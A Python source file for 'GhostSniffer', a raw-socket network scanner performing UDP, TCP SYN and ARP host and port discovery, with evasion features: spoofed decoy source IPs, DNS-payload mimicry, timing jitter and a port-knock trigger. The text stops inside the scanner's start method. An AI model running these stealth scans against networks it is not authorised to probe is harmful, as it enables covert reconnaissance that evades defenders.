#!/usr/bin/env python3
"""
GhostSniffer v2.0 — Advanced Network Reconnaissance Tool
Zero Dependencies | Raw Sockets | Stealth Ops | Protocol Mimicry
"""

import socket
import struct
import ipaddress
import os
import sys
import time
import random
import threading
import argparse
import json
import subprocess
import ssl
from datetime import datetime

# ============================================================================
#  Load .env file if present (searches multiple locations)
# ============================================================================

def load_dotenv():
    """Load environment variables from .env file.

    Search order (first found wins per key):
    1. /etc/ghost_sniffer/.env   (system-wide — Linux)
    2. ~/.config/ghost_sniffer/.env (user config)
    3. Current working directory .env
    4. Script directory .env
    """
    search_paths = []

    if os.name != 'nt':
        search_paths.append('/etc/ghost_sniffer/.env')

    home = os.path.expanduser('~')
    search_paths.append(os.path.join(home, '.config', 'ghost_sniffer', '.env'))
    search_paths.append(os.path.join(os.getcwd(), '.env'))

    base_dir = os.path.dirname(os.path.abspath(__file__))
    search_paths.append(os.path.join(base_dir, '.env'))

    for env_path in search_paths:
        try:
            with open(env_path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if '=' in line:
                            key, val = line.split('=', 1)
                            os.environ.setdefault(key.strip(), val.strip())
        except FileNotFoundError:
            continue

# ============================================================================
#  Checksum Utilities (RFC 1071)
# ============================================================================

def inet_checksum(data: bytes) -> int:
    """Calculate the Internet Checksum per RFC 1071."""
    if len(data) % 2:
        data += b'\x00'
    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) | data[i + 1]
        total += word
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF


def compute_udp_checksum(src_ip: str, dst_ip: str, udp_packet: bytes) -> int:
    """Calculate UDP checksum including the IPv4 pseudo-header."""
    pseudo_header = (
        socket.inet_aton(src_ip)
        + socket.inet_aton(dst_ip)
        + struct.pack('!BBH', 0, socket.IPPROTO_UDP, len(udp_packet))
    )
    return inet_checksum(pseudo_header + udp_packet)


def compute_tcp_checksum(src_ip: str, dst_ip: str, tcp_packet: bytes) -> int:
    """Calculate TCP checksum including the IPv4 pseudo-header."""
    pseudo_header = (
        socket.inet_aton(src_ip)
        + socket.inet_aton(dst_ip)
        + struct.pack('!BBH', 0, socket.IPPROTO_TCP, len(tcp_packet))
    )
    return inet_checksum(pseudo_header + tcp_packet)

# ============================================================================
#  Protocol Parsers
# ============================================================================

class IP:
    """Parse a raw IPv4 header (supports options)."""

    PROTO_MAP = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}

    def __init__(self, raw: bytes):
        if len(raw) < 1:
            raise ValueError("Truncated IP header")
        ver_ihl = raw[0]
        ihl = ver_ihl & 0xF
        header_len = ihl * 4
        if len(raw) < header_len:
            raise ValueError("Truncated IP header with options")

        fmt = f'!BBHHHBBH{4}s{4}s'
        unpacked = struct.unpack(fmt, raw[:header_len])
        self.ver        = unpacked[0] >> 4
        self.ihl        = ihl
        self.tos        = unpacked[1]
        self.total_len  = unpacked[2]
        self.ident      = unpacked[3]
        self.flags_frag = unpacked[4]
        self.ttl        = unpacked[5]
        self.proto_num  = unpacked[6]
        self.checksum   = unpacked[7]
        self.src_raw    = unpacked[8]
        self.dst_raw    = unpacked[9]

        self.src_address = ipaddress.ip_address(self.src_raw)
        self.dst_address = ipaddress.ip_address(self.dst_raw)
        self.protocol    = self.PROTO_MAP.get(self.proto_num, str(self.proto_num))
        self.header_len  = header_len

    def __str__(self):
        return (f"IP [{self.protocol}] {self.src_address} -> "
                f"{self.dst_address} "
                f"(TTL:{self.ttl} Len:{self.total_len})")


class ICMP:
    """Parse a raw ICMP header (type, code, checksum)."""

    TYPE_MAP = {
        0: 'Echo Reply',
        3: 'Dest Unreachable',
        8: 'Echo Request',
        11: 'Time Exceeded',
    }

    def __init__(self, raw: bytes):
        if len(raw) < 4:
            raise ValueError("Truncated ICMP header")
        header = struct.unpack('!BBH', raw[:4])
        self.type     = header[0]
        self.code     = header[1]
        self.checksum = header[2]
        self.type_str = self.TYPE_MAP.get(self.type, f'Type-{self.type}')

    def __str__(self):
        return (f"ICMP {self.type_str} "
                f"(Type:{self.type} Code:{self.code})")


class TCP:
    """Parse a raw TCP header (20 bytes minimum)."""

    def __init__(self, raw: bytes):
        if len(raw) < 20:
            raise ValueError("Truncated TCP header")
        fields = struct.unpack('!HHIIBBHHH', raw[:20])
        self.src_port     = fields[0]
        self.dst_port     = fields[1]
        self.seq          = fields[2]
        self.ack_num      = fields[3]
        self.data_offset  = (fields[4] >> 4) * 4
        self.flags        = fields[5]
        self.window       = fields[6]
        self.checksum     = fields[7]
        self.urg_ptr      = fields[8]

        # Individual flags
        self.flag_fin = bool(self.flags & 0x01)
        self.flag_syn = bool(self.flags & 0x02)
        self.flag_rst = bool(self.flags & 0x04)
        self.flag_psh = bool(self.flags & 0x08)
        self.flag_ack = bool(self.flags & 0x10)
        self.flag_urg = bool(self.flags & 0x20)

    def __str__(self):
        flag_strs = []
        if self.flag_syn: flag_strs.append('SYN')
        if self.flag_ack: flag_strs.append('ACK')
        if self.flag_rst: flag_strs.append('RST')
        if self.flag_fin: flag_strs.append('FIN')
        if self.flag_psh: flag_strs.append('PSH')
        if self.flag_urg: flag_strs.append('URG')
        return (f"TCP {self.src_port} -> {self.dst_port} "
                f"[{','.join(flag_strs)}] "
                f"Seq:{self.seq} Win:{self.window}")

# ============================================================================
#  Packet Builders
# ============================================================================

class PacketBuilder:
    """Construct raw network packets for scanning operations."""

    @staticmethod
    def build_dns_query(domain: str = "google.com") -> bytes:
        """Build a DNS query payload for protocol mimicry."""
        txn_id = struct.pack('!H', random.randint(0, 0xFFFF))
        flags  = struct.pack('!H', 0x0100)
        counts = struct.pack('!HHHH', 1, 0, 0, 0)

        qname = b''
        for label in domain.split('.'):
            qname += struct.pack('B', len(label)) + label.encode('ascii')
        qname += b'\x00'

        qtype_class = struct.pack('!HH', 1, 1)
        return txn_id + flags + counts + qname + qtype_class

    @staticmethod
    def build_normal_payload() -> bytes:
        """Build a random payload of 32-128 bytes."""
        return os.urandom(random.randint(32, 128))

    @staticmethod
    def build_udp_header(src_port: int, dst_port: int,
                         payload: bytes,
                         src_ip: str, dst_ip: str) -> bytes:
        """Build a UDP header with correct checksum."""
        length = 8 + len(payload)
        header_zero = struct.pack('!HHHH', src_port, dst_port, length, 0)
        csum = compute_udp_checksum(src_ip, dst_ip, header_zero + payload)
        if csum == 0:
            csum = 0xFFFF
        return struct.pack('!HHHH', src_port, dst_port, length, csum)

    @staticmethod
    def build_ip_header(src_ip: str, dst_ip: str,
                        payload_len: int,
                        proto: int = socket.IPPROTO_UDP) -> bytes:
        """Build an IPv4 header. *proto* defaults to UDP but can be TCP."""
        ver_ihl   = 0x45
        tos       = 0
        total_len = 20 + payload_len
        ident     = random.randint(1, 0xFFFF)
        frag      = 0
        ttl       = random.randint(60, 128)
        src       = socket.inet_aton(src_ip)
        dst       = socket.inet_aton(dst_ip)

        header = struct.pack('!BBHHHBBH4s4s',
                             ver_ihl, tos, total_len, ident,
                             frag, ttl, proto, 0, src, dst)
        csum = inet_checksum(header)
        header = struct.pack('!BBHHHBBH4s4s',
                             ver_ihl, tos, total_len, ident,
                             frag, ttl, proto, csum, src, dst)
        return header

    @staticmethod
    def build_full_packet(src_ip: str, dst_ip: str,
                          src_port: int, dst_port: int,
                          payload: bytes) -> bytes:
        """Build a complete IP+UDP packet."""
        udp_hdr = PacketBuilder.build_udp_header(
            src_port, dst_port, payload, src_ip, dst_ip)
        udp_segment = udp_hdr + payload
        ip_hdr = PacketBuilder.build_ip_header(
            src_ip, dst_ip, len(udp_segment), proto=socket.IPPROTO_UDP)
        return ip_hdr + udp_segment

    @staticmethod
    def build_tcp_syn(src_ip: str, dst_ip: str,
                      src_port: int, dst_port: int,
                      seq: int = None) -> bytes:
        """Build a TCP SYN packet (IP + TCP header, no payload).

        This constructs a half-open probe: SYN flag set, ACK=0,
        data-offset=5 (20-byte header, no options), window=65535.
        The kernel will auto-RST any SYN-ACK we receive because
        there is no matching socket.
        """
        if seq is None:
            seq = random.randint(0, 0xFFFFFFFF)

        # TCP header fields
        data_offset_reserved = 0x50   # data offset = 5 words (20 bytes)
        flags                = 0x02   # SYN
        window               = 65535
        urg_ptr              = 0

        # Build TCP header with zero checksum first
        tcp_header = struct.pack('!HHIIBBHHH',
                                 src_port, dst_port,
                                 seq, 0,
                                 data_offset_reserved, flags,
                                 window, 0, urg_ptr)

        # Compute TCP checksum with pseudo-header
        csum = compute_tcp_checksum(src_ip, dst_ip, tcp_header)
        tcp_header = struct.pack('!HHIIBBHHH',
                                 src_port, dst_port,
                                 seq, 0,
                                 data_offset_reserved, flags,
                                 window, csum, urg_ptr)

        # IP header (proto = TCP)
        ip_header = PacketBuilder.build_ip_header(
            src_ip, dst_ip, len(tcp_header), proto=socket.IPPROTO_TCP)

        return ip_header + tcp_header

    @staticmethod
    def build_arp_request(target_ip: str,
                          local_mac: bytes,
                          local_ip: str) -> bytes:
        """Build an ARP Request frame (Ethernet + ARP).

        Ethernet header (14 bytes):
            dst_mac  = ff:ff:ff:ff:ff:ff  (broadcast)
            src_mac  = local_mac
            ethertype = 0x0806 (ARP)

        ARP header (28 bytes):
            htype=1 (Ethernet), ptype=0x0800 (IPv4)
            hlen=6, plen=4, op=1 (request)
            sender MAC, sender IP, target MAC (zero), target IP
        """
        # Ethernet header
        eth_dst  = b'\xff\xff\xff\xff\xff\xff'
        eth_type = struct.pack('!H', 0x0806)
        eth_header = eth_dst + local_mac + eth_type

        # ARP header
        arp_header = struct.pack('!HHBBH',
                                 1,       # hardware type: Ethernet
                                 0x0800,  # protocol type: IPv4
                                 6,       # hardware addr len
                                 4,       # protocol addr len
                                 1)       # operation: request
        sender_mac = local_mac
        sender_ip  = socket.inet_aton(local_ip)
        target_mac = b'\x00\x00\x00\x00\x00\x00'
        target_ip_b = socket.inet_aton(target_ip)

        arp_payload = (sender_mac + sender_ip +
                       target_mac + target_ip_b)

        return eth_header + arp_header + arp_payload

# ============================================================================
#  Thread-Safe Host Registry
# ============================================================================

class HostRegistry:
    """Central, thread-safe store for all discovered hosts and scan data."""

    def __init__(self):
        self._lock = threading.Lock()
        self._hosts: dict = {}
        self._responsive: set = set()
        self._last_scan: dict = {}   # ip -> timestamp (float)

    # -- Registration --------------------------------------------------------

    def register(self, ip: str, protocol: str) -> bool:
        """Register a host. Returns True if the host is new."""
        now = datetime.now().isoformat()
        with self._lock:
            if ip not in self._hosts:
                self._hosts[ip] = {
                    'ip': ip,
                    'first_seen': now,
                    'last_seen': now,
                    'packet_count': 1,
                    'protocols': {protocol},
                    'status': 'discovered',
                    'open_ports': set(),
                    'os_guess': '',
                    'ttl': 0,
                    'services': {},
                }
                return True
            else:
                entry = self._hosts[ip]
                entry['last_seen'] = now
                entry['packet_count'] += 1
                entry['protocols'].add(protocol)
                return False

    def mark_responsive(self, ip: str,
                        icmp_type: int, icmp_code: int) -> None:
        """Flag a host as confirmed up (e.g. via ICMP/ARP)."""
        now = datetime.now().isoformat()
        with self._lock:
            self._responsive.add(ip)
            if ip in self._hosts:
                self._hosts[ip]['status'] = 'up'
                if icmp_type or icmp_code:
                    self._hosts[ip]['icmp_response'] = \
                        f"Type:{icmp_type} Code:{icmp_code}"
            else:
                self._hosts[ip] = {
                    'ip': ip,
                    'first_seen': now,
                    'last_seen': now,
                    'packet_count': 1,
                    'protocols': {'ICMP'},
                    'status': 'up',
                    'icmp_response': f"Type:{icmp_type} Code:{icmp_code}",
                    'open_ports': set(),
                    'os_guess': '',
                    'ttl': 0,
                    'services': {},
                }

    # -- Scan tracking -------------------------------------------------------

    def mark_scanned(self, ip: str) -> None:
        """Record that we just scanned this IP (for response matching)."""
        with self._lock:
            self._last_scan[ip] = time.time()

    def was_scanned_recently(self, ip: str,
                             seconds: float = 15.0) -> bool:
        """Check if this IP was scanned within the last *seconds*."""
        with self._lock:
            ts = self._last_scan.get(ip, 0.0)
            return (time.time() - ts) <= seconds

    # -- Feature-specific setters -------------------------------------------

    def add_open_port(self, ip: str, port: int) -> None:
        """Record an open TCP port for a host (thread-safe)."""
        with self._lock:
            if ip in self._hosts:
                self._hosts[ip]['open_ports'].add(port)
            else:
                now = datetime.now().isoformat()
                self._hosts[ip] = {
                    'ip': ip,
                    'first_seen': now,
                    'last_seen': now,
                    'packet_count': 1,
                    'protocols': {'TCP'},
                    'status': 'up',
                    'open_ports': {port},
                    'os_guess': '',
                    'ttl': 0,
                    'services': {},
                }
            self._responsive.add(ip)

    def update_os(self, ip: str, os_guess: str, ttl: int) -> None:
        """Update the passive OS fingerprint for a host."""
        with self._lock:
            if ip in self._hosts:
                self._hosts[ip]['os_guess'] = os_guess
                self._hosts[ip]['ttl'] = ttl

    def add_service(self, ip: str, port: int, version: str) -> None:
        """Record a service version string for an open port."""
        with self._lock:
            if ip in self._hosts:
                self._hosts[ip]['services'][port] = version

    # -- Getters -------------------------------------------------------------

    def get_all(self) -> dict:
        """Return a deep copy of all hosts (sets → sorted lists)."""
        with self._lock:
            out = {}
            for ip, info in self._hosts.items():
                copy = dict(info)
                copy['protocols']  = sorted(info['protocols'])
                copy['open_ports'] = sorted(info.get('open_ports', set()))
                copy['services']   = dict(info.get('services', {}))
                out[ip] = copy
            return out

    def get_responsive(self) -> set:
        with self._lock:
            return set(self._responsive)

    def count(self) -> int:
        with self._lock:
            return len(self._hosts)

    def responsive_count(self) -> int:
        with self._lock:
            return len(self._responsive)

# ============================================================================
#  Sniffer Engine
# ============================================================================

class SnifferEngine:
    """Raw-socket listener that captures and analyses network traffic.

    Supports:
    - ICMP response matching (existing)
    - TCP SYN-ACK / RST detection  (Feature 1)
    - ARP reply capture             (Feature 2 — AF_PACKET only)
    - Passive OS fingerprinting     (Feature 3)
    - Port-knock sequence matching  (Feature 4)
    """

    @staticmethod
    def _detect_local_ip() -> str:
        """Discover the primary outbound IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '0.0.0.0'

    def __init__(self, registry: HostRegistry,
                 subnet_filter=None,
                 verbose: bool = False,
                 scan_mode: bool = False,
                 knock_listener=None):
        self.registry       = registry
        self.subnet_filter  = subnet_filter
        self.verbose        = verbose
        self.scan_mode      = scan_mode
        self.knock_listener = knock_listener
        self._running       = False
        self._socket        = None
        self._thread        = None
        self._stats         = {'packets_captured': 0, 'icmp_responses': 0}
        self.packet_offset  = 0
        self.is_af_packet   = False
        self._local_ip      = self._detect_local_ip()

    # -- OS Fingerprinting ---------------------------------------------------

    @staticmethod
    def _guess_os(ttl: int) -> str:
        """Guess the remote OS from the observed TTL value."""
        if ttl <= 64:
            return "Linux/Unix"
        elif ttl <= 128:
            return "Windows"
        else:
            return "Network Device"

    # -- ARP handling (AF_PACKET only) ---------------------------------------

    def _handle_arp(self, arp_data: bytes) -> None:
        """Parse an ARP reply and register the sender."""
        if len(arp_data) < 28:
            return
        op = struct.unpack('!H', arp_data[6:8])[0]
        if op != 2:            # only replies
            return
        sender_ip = socket.inet_ntoa(arp_data[14:18])

        should_register = True
        if self.subnet_filter:
            try:
                should_register = (
                    ipaddress.ip_address(sender_ip) in self.subnet_filter)
            except ValueError:
                should_register = False

        if should_register:
            is_new = self.registry.register(sender_ip, 'ARP')
            self.registry.mark_responsive(sender_ip, 0, 0)
            if is_new:
                print(f"[+] Host Up: {sender_ip} (ARP Reply)")

    # -- Socket setup & thread -----------------------------------------------

    def start(self) -> None:
        """Create the raw socket and launch the sniffer thread."""
        if os.name == 'nt':
            sock = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            sock.bind((self._local_ip, 0))
            try:
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except OSError:
                if self.verbose:
                    print("[!] IP_HDRINCL not supported; capture may be limited")
            try:
                sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
            except Exception:
                if self.verbose:
                    print("[!] RCVALL not supported; capture may be limited")
            self.packet_offset = 0
            self.is_af_packet  = False
        else:
            # Try AF_PACKET for full capture (incl. ARP), fallback to ICMP
            try:
                sock = socket.socket(
                    socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
                self.packet_offset = 14
                self.is_af_packet  = True
                if self.verbose:
                    print("[*] Using AF_PACKET for full packet capture")
            except (AttributeError, PermissionError) as e:
                if self.verbose:
                    print(f"[!] AF_PACKET failed ({e}), falling back to ICMP-only")
                try:
                    sock = socket.socket(
                        socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    sock.bind((self._local_ip, 0))
                    sock.setsockopt(
                        socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                except PermissionError:
                    raise PermissionError(
                        "Need root privileges for raw socket")
                self.packet_offset = 0
                self.is_af_packet  = False

        self._socket = sock
        self._socket.settimeout(1.0)

        self._running = True
        self._thread = threading.Thread(
            target=self._sniff_loop, daemon=True, name='Sniffer')
        self._thread.start()
        print("[+] Sniffer engine started")

    # -- Main capture loop ---------------------------------------------------

    def _sniff_loop(self) -> None:
        while self._running:
            try:
                if self.is_af_packet:
                    raw_buffer, _ = self._socket.recvfrom(65565)

                    # ---- Check EtherType before stripping ----
                    if len(raw_buffer) < 14:
                        continue
                    eth_proto = struct.unpack('!H', raw_buffer[12:14])[0]

                    if eth_proto == 0x0806:          # ARP
                        self._handle_arp(raw_buffer[14:])
                        continue
                    elif eth_proto != 0x0800:        # Not IPv4
                        continue

                    raw_buffer = raw_buffer[self.packet_offset:]
                else:
                    raw_buffer, _ = self._socket.recvfrom(65565)
            except socket.timeout:
                continue
            except OSError:
                break

            if len(raw_buffer) < 20:
                continue

            try:
                ip_hdr = IP(raw_buffer[:60])
            except Exception:
                continue

            self._stats['packets_captured'] += 1
            src_ip = str(ip_hdr.src_address)

            # ---- Passive OS Fingerprinting (Feature 3) ----
            os_guess = self._guess_os(ip_hdr.ttl)

            # ---- Host registration ----
            if self.subnet_filter:
                if ip_hdr.src_address in self.subnet_filter:
                    is_new = self.registry.register(src_ip, ip_hdr.protocol)
                    self.registry.update_os(src_ip, os_guess, ip_hdr.ttl)
                    if is_new and not self.scan_mode:
                        print(f"[+] New host: {src_ip} [{ip_hdr.protocol}]")
            else:
                is_new = self.registry.register(src_ip, ip_hdr.protocol)
                self.registry.update_os(src_ip, os_guess, ip_hdr.ttl)
                if is_new and not self.scan_mode:
                    print(f"[+] New host: {src_ip} [{ip_hdr.protocol}]")

            # ---- ICMP handling (scan mode) ----
            if self.scan_mode and ip_hdr.protocol == 'ICMP':
                offset = ip_hdr.header_len
                if len(raw_buffer) >= offset + 4:
                    try:
                        icmp_hdr = ICMP(raw_buffer[offset:offset + 4])
                    except Exception:
                        continue

                    if self.verbose:
                        print(f"[*] {ip_hdr} | {icmp_hdr}")

                    # Port Unreachable -> host up
                    if icmp_hdr.type == 3 and icmp_hdr.code == 3:
                        if self.registry.was_scanned_recently(src_ip):
                            self._stats['icmp_responses'] += 1
                            self.registry.mark_responsive(
                                src_ip, icmp_hdr.type, icmp_hdr.code)
                            print(f"[+] Host Up: {src_ip} "
                                  f"(ICMP Port Unreachable)")
                        elif self.verbose:
                            print(f"[!] Ignored ICMP from {src_ip} "
                                  f"(not recently scanned)")

            # ---- TCP handling — SYN-ACK / RST detection (Feature 1) ----
            if self.scan_mode and ip_hdr.protocol == 'TCP':
                offset = ip_hdr.header_len
                if len(raw_buffer) >= offset + 20:
                    try:
                        tcp_hdr = TCP(raw_buffer[offset:offset + 20])
                    except Exception:
                        continue

                    if self.registry.was_scanned_recently(src_ip):
                        if tcp_hdr.flag_syn and tcp_hdr.flag_ack:
                            # SYN-ACK → port is OPEN
                            self.registry.add_open_port(
                                src_ip, tcp_hdr.src_port)
                            self.registry.mark_responsive(src_ip, 0, 0)
                            print(f"[+] Open port: "
                                  f"{src_ip}:{tcp_hdr.src_port}")
                        elif tcp_hdr.flag_rst:
                            if self.verbose:
                                print(f"[*] Closed port: "
                                      f"{src_ip}:{tcp_hdr.src_port}")

            # ---- Port Knocking (Feature 4) ----
            if self.knock_listener:
                if ip_hdr.protocol == 'UDP':
                    offset = ip_hdr.header_len
                    if len(raw_buffer) >= offset + 8:
                        dst_port = struct.unpack(
                            '!H', raw_buffer[offset + 2:offset + 4])[0]
                        if self.knock_listener.check_packet('UDP', dst_port):
                            print("[+] Knock sequence complete! "
                                  "Executing action...")
                            self.knock_listener.execute_action()

                elif ip_hdr.protocol == 'ICMP':
                    offset = ip_hdr.header_len
                    if len(raw_buffer) >= offset + 4:
                        icmp_type = raw_buffer[offset]
                        if self.knock_listener.check_packet(
                                'ICMP', icmp_type):
                            print("[+] Knock sequence complete! "
                                  "Executing action...")
                            self.knock_listener.execute_action()

            # ---- Verbose dump for passive mode ----
            if self.verbose and not self.scan_mode and not self.knock_listener:
                print(f"[*] {ip_hdr}")

    # -- Teardown ------------------------------------------------------------

    def stop(self) -> None:
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
        if self._socket:
            if os.name == 'nt':
                try:
                    self._socket.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
                except Exception:
                    pass
            self._socket.close()
        print("[+] Sniffer engine stopped")

    @property
    def stats(self) -> dict:
        return dict(self._stats)

# ============================================================================
#  Scanner Engine
# ============================================================================

class ScannerEngine:
    """Active network scanner supporting UDP, TCP SYN, and ARP modes."""

    def __init__(self, registry: HostRegistry, target_subnet: str,
                 port: int = 65212,
                 ports: list = None,
                 scan_type: str = 'udp',
                 mimicry: str = 'normal',
                 dns_domain: str = 'google.com',
                 jitter: tuple = None,
                 decoys: list = None,
                 verbose: bool = False):
        self.registry       = registry
        self.target_subnet  = ipaddress.ip_network(target_subnet, strict=False)
        self.port           = port            # UDP destination port
        self.ports          = ports or []     # TCP SYN target ports
        self.scan_type      = scan_type       # 'udp' | 'tcp_syn' | 'arp'
        self.mimicry        = mimicry
        self.dns_domain     = dns_domain
        self.jitter         = jitter
        self.decoys         = decoys or []
        self.verbose        = verbose

        self._running  = False
        self._thread   = None
        self._socket   = None
        self._stats    = {
            'packets_sent': 0,
            'decoy_packets_sent': 0,
            'hosts_scanned': 0,
        }
        self._local_ip = self._detect_local_ip()

    # -- Helpers -------------------------------------------------------------

    @staticmethod
    def _detect_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '0.0.0.0'

    @staticmethod
    def _get_local_interface() -> str:
        """Return the primary network interface name (Linux only)."""
        try:
            with open('/proc/net/route') as f:
                for line in f:
                    fields = line.strip().split()
                    if len(fields) >= 2 and fields[1] == '00000000':
                        return fields[0]
        except Exception:
            pass
        try:
            for iface in sorted(os.listdir('/sys/class/net/')):
                if iface != 'lo':
                    return iface
        except Exception:
            pass
        return 'eth0'

    @staticmethod
    def _get_local_mac() -> bytes:
        """Return the MAC address of the primary interface (6 bytes)."""
        try:
            if os.name != 'nt':
                iface = ScannerEngine._get_local_interface()
                path = f'/sys/class/net/{iface}/address'
                if os.path.exists(path):
                    with open(path) as f:
                        mac_str = f.read().strip()
                        return bytes.fromhex(mac_str.replace(':', ''))
        except Exception:
            pass
        # Fallback via uuid
        import uuid
        mac = uuid.getnode()
        return bytes([(mac >> (8 * (5 - i))) & 0xFF for i in range(6)])

    def _build_payload(self) -> bytes:
        if self.mimicry == 'dns':
            return PacketBuilder.build_dns_query(self.dns_domain)
        return PacketBuilder.build_normal_payload()

    def _send_packet(self, src_ip: str, dst_ip: str,
                     payload: bytes) -> bool:
        """Send a raw UDP packet."""
        src_port = random.randint(1024, 65535)
        packet = PacketBuilder.build_full_packet(
            src_ip, dst_ip, src_port, self.port, payload)
        try:
            self._socket.sendto(packet, (dst_ip, 0))
            return True
        except PermissionError:
            print("[!] Permission denied — run as Administrator/root")
            self._running = False
            return False
        except Exception as e:
            if self.verbose:
                print(f"[!] Send to {dst_ip} failed: {e}")
            return False

    # -- Progress bar helper -------------------------------------------------

    @staticmethod
    def _progress(current: int, total: int) -> None:
        if total == 0:
            return
        pct    = int(current / total * 100)
        filled = int(30 * current / total)
        bar    = '\u2588' * filled + '\u2591' * (30 - filled)
        sys.stdout.write(f"\r  [{bar}] {pct}% ({current}/{total})")
        sys.stdout.flush()

    # -- UDP scan (original behaviour) ---------------------------------------

    def _udp_scan(self) -> None:
        hosts = list(self.target_subnet.hosts())
        total = len(hosts)

        for i, host in enumerate(hosts, 1):
            if not self._running:
                break

            dst = str(host)
            payload = self._build_payload()
            self.registry.mark_scanned(dst)

            if self.decoys:
                senders = [(self._local_ip, False)]
                for decoy_ip in self.decoys:
                    senders.append((decoy_ip, True))
                random.shuffle(senders)

                for src_ip, is_decoy in senders:
                    if not self._running:
                        return
                    pld = self._build_payload() if is_decoy else payload
                    if self._send_packet(src_ip, dst, pld):
                        key = 'decoy_packets_sent' if is_decoy \
                              else 'packets_sent'
                        self._stats[key] += 1
                    time.sleep(random.uniform(0.005, 0.03))
            else:
                if self._send_packet(self._local_ip, dst, payload):
                    self._stats['packets_sent'] += 1

            self._stats['hosts_scanned'] = i

            if i % 10 == 0 or i == total:
                self._progress(i, total)

            if self.jitter and self._running:
                delay = random.uniform(self.jitter[0], self.jitter[1])
                if self.verbose:
                    print(f"  jitter: {delay:.2f}s")
                elapsed = 0.0
                while elapsed < delay and self._running:
                    chunk = min(0.1, delay - elapsed)
                    time.sleep(chunk)
                    elapsed += chunk

    # -- TCP SYN scan (Feature 1) --------------------------------------------

    def _tcp_syn_scan(self) -> None:
        hosts  = list(self.target_subnet.hosts())
        ports  = self.ports if self.ports else list(range(1, 1025))
        total  = len(hosts) * len(ports)
        count  = 0
        scanned_hosts = set()

        for host in hosts:
            if not self._running:
                break
            host_ip = str(host)
            self.registry.mark_scanned(host_ip)
            scanned_hosts.add(host_ip)

            for port in ports:
                if not self._running:
                    break
                count += 1

                if self.decoys:
                    senders = [(self._local_ip, False)]
                    for decoy_ip in self.decoys:
                        senders.append((decoy_ip, True))
                    random.shuffle(senders)

                    for src_ip, is_decoy in senders:
                        if not self._running:
                            return
                        src_port = random.randint(1024, 65535)
                        pkt = PacketBuilder.build_tcp_syn(
                            src_ip, host_ip, src_port, port)
                        try:
                            self._socket.sendto(pkt, (host_ip, 0))
                            key = 'decoy_packets_sent' if is_decoy \
                                  else 'packets_sent'
                            self._stats[key] += 1
                        except Exception as e:
                            if self.verbose:
                                print(f"[!] SYN to {host_ip}:{port} "
                                      f"failed: {e}")
                        time.sleep(random.uniform(0.005, 0.03))
                else:
                    src_port = random.randint(1024, 65535)
                    pkt = PacketBuilder.build_tcp_syn(
                        self._local_ip, host_ip, src_port, port)
                    try:
                        self._socket.sendto(pkt, (host_ip, 0))
                        self._stats['packets_sent'] += 1
                    except Exception as e:
                        if self.verbose:
                            print(f"[!] SYN to {host_ip}:{port} "
                                  f"failed: {e}")

                self._stats['hosts_scanned'] = len(scanned_hosts)

                if count % 10 == 0 or count == total:
                    self._progress(count, total)

                # Inter-probe delay
                if self.jitter and self._running:
                    delay = random.uniform(self.jitter[0], self.jitter[1])
                    elapsed = 0.0
                    while elapsed < delay and self._running:
                        chunk = min(0.1, delay - elapsed)
                        time.sleep(chunk)
                        elapsed += chunk
                else:
                    time.sleep(random.uniform(0.001, 0.01))

    # -- ARP scan (Feature 2 — Linux only) -----------------------------------

    def _arp_scan(self) -> None:
        if os.name == 'nt':
            print("[!] ARP scan is not supported on Windows")
            return

        hosts = list(self.target_subnet.hosts())
        total = len(hosts)
        local_mac = self._get_local_mac()

        for i, host in enumerate(hosts, 1):
            if not self._running:
                break

            host_ip = str(host)
            self.registry.mark_scanned(host_ip)

            arp_pkt = PacketBuilder.build_arp_request(
                host_ip, local_mac, self._local_ip)
            try:
                self._socket.send(arp_pkt)
                self._stats['packets_sent'] += 1
            except Exception as e:
                if self.verbose:
                    print(f"[!] ARP send to {host_ip} failed: {e}")

            self._stats['hosts_scanned'] = i

            if i % 10 == 0 or i == total:
                self._progress(i, total)

            time.sleep(random.uniform(0.001, 0.01))

    # -- Dispatcher ----------------------------------------------------------

    def _scan_loop(self) -> None:
        """Pick the right sub-scanner based on scan_type."""
        if self.scan_type == 'tcp_syn':
            self._tcp_syn_scan()
        elif self.scan_type == 'arp':
            self._arp_scan()
        else:
            self._udp_scan()

        sys.stdout.write('\n')
        print('[+] Scan sweep complete')
        self._running = False

    # -- Start / Stop --------------------------------------------------------

    def start(self) -> None:
        # ---- Create the right socket type ----
        if self.scan_type == 'arp':
            if os.name == 'nt':
                print("[!] ARP scan is not supported on Windows")
                return
            try:
                interface = self._get_local_interface()
                sock = socket.socket(
                    socket.AF_PACKET, socket.SOCK_RAW,
                    socket.htons(0x0003))
                sock.bind((interface, 0))
            except (AttributeError, PermissionError, OSError) as e:
                print(f"[!] Cannot create ARP socket: {e}")
                print("[*] ARP scan requires root and AF_PACKET support")
                return
        else:
            if os.name == 'nt':
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_RAW,
                    socket.IPPROTO_UDP)
            else:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_RAW,
                    socket.IPPROTO_RAW)
            try:
                sock.setsockopt(
                    socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except OSError as e:
                if self.verbose:
                    print(f"[!] IP_HDRINCL not supported: {e}")

        self._socket  = sock
        self._running = True
        self._thread  = threading.Thread(
            target=self._scan_loop, daemon=True, name='Scanner')
        self._thread.start()

        # ---- Print scan configuration ----
        host_count = sum(1 for _ in self.target_subnet.hosts())
        print(f"[>] Target: {self.target_subnet} ({host_count} hosts)")
